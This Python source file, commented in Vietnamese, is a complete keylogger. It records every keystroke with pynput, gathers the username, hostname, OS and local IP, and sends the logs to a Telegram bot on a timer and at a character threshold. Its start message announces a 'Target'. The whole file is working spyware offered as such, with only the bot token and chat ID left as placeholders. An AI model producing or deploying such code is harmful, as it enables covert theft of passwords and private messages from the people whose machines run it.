import requests      
import time          
import threading     
import platform      
import socket        
import getpass       
from datetime import datetime  

try:
    from pynput.keyboard import Key, Listener  
except ImportError:
    exit(1)  

# ========================================
# CẤU HÌNH TELEGRAM BOT
# ========================================
BOT_TOKEN = 'YOUR_TOKEN'  # Token bot Telegram
CHAT_ID = 'YOUR_ID'                                          
TELEGRAM_API_URL = 'https://api.telegram.org/bot{}/sendMessage'.format(BOT_TOKEN)

LOG_CHAR_LIMIT = 100    # Gửi log khi đạt 100 ký tự
SEND_INTERVAL = 10      # Gửi log định kỳ mỗi 10 giây

full_log = ''           # Lưu toàn bộ phím đã bấm
word = ''               # Lưu từ đang được gõ

def get_system_info():
    info = [
        "📅 Scan Time: {}".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S')),  
        "👤 Current User: {}".format(getpass.getuser()),                          
        "🖥️ OS: {} {}".format(platform.system(), platform.release())             
    ]
    
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append("🌐 Local IP: {}".format(local_ip))
    except:
        info.append("🌐 Local IP: Không xác định được")
    
    return '\n'.join(info)

def send_telegram(msg):
    try:
        response = requests.post(TELEGRAM_API_URL, data={'chat_id': CHAT_ID, 'text': msg}, timeout=5)
        return True  
    except:
        return False  

def send_log():
    global full_log
    
    if full_log.strip():
        msg = full_log.strip()
        
        if len(msg) > 4096:
            msg = msg[-4096:]  
        
        if send_telegram('[KEYLOG] {}'.format(msg)):
            full_log = '' 
def periodic_send():
    """
    Hàm chạy trong thread riêng để gửi log định kỳ
    Gửi log mỗi SEND_INTERVAL giây nếu có dữ liệu
    """
    while True:
        time.sleep(SEND_INTERVAL)      
        if full_log.strip():           
            send_log()                 

def on_press(key):
    global word, full_log
    
    try:
        if key == Key.space:
            word += ' '               
            full_log += word          
            word = ''                 
            
        elif key == Key.enter:
            word += '\n'              
            full_log += word           
            word = ''                 
            
        elif key == Key.tab:
            word += '[TAB]'           
            
        elif key == Key.backspace:
            if word:                  
                word = word[:-1]
            else:                     
                full_log = full_log[:-1]
                
        elif key in (Key.shift_l, Key.shift_r, Key.ctrl_l, Key.ctrl_r, Key.alt_l, Key.alt_r):
            return
            
        elif key == Key.esc:
            send_log()                
            return False              
            
        else:
            try:
                if key.char is not None:
                    word += key.char
                else:
                    word += "[{}]".format(key.name.upper())
            except AttributeError:
                word += "[{}]".format(str(key).replace('Key.', '').upper())
        
        if len(full_log) >= LOG_CHAR_LIMIT:
            send_log()                
            
    except:
        pass  

def main():
    """
    Hàm main điều khiển luồng chính của keylogger:
    1. Gửi thông báo bắt đầu
    2. Gửi thông tin hệ thống 
    3. Khởi động thread gửi định kỳ
    4. Bắt đầu lắng nghe phím bấm
    5. Gửi thông báo kết thúc
    """
    
    start_msg = "🚀 Keylogger started at {}\n📱 Target: {}@{}".format(
        time.strftime('%Y-%m-%d %H:%M:%S'),  
        getpass.getuser(),                    
        socket.gethostname()                  
    )
    send_telegram(start_msg)
    
    system_info = get_system_info()
    send_telegram('[SYSTEM INFO]\n{}'.format(system_info))
    
    periodic_thread = threading.Thread(target=periodic_send, daemon=True)
    periodic_thread.start()
    
    with Listener(on_press=on_press) as listener:
        listener.join() 
    
    stop_msg = "🛑 Keylogger stopped at {}".format(time.strftime('%Y-%m-%d %H:%M:%S'))
    send_telegram(stop_msg)

if __name__ == "__main__":
    main()  # Chạy hàm chính

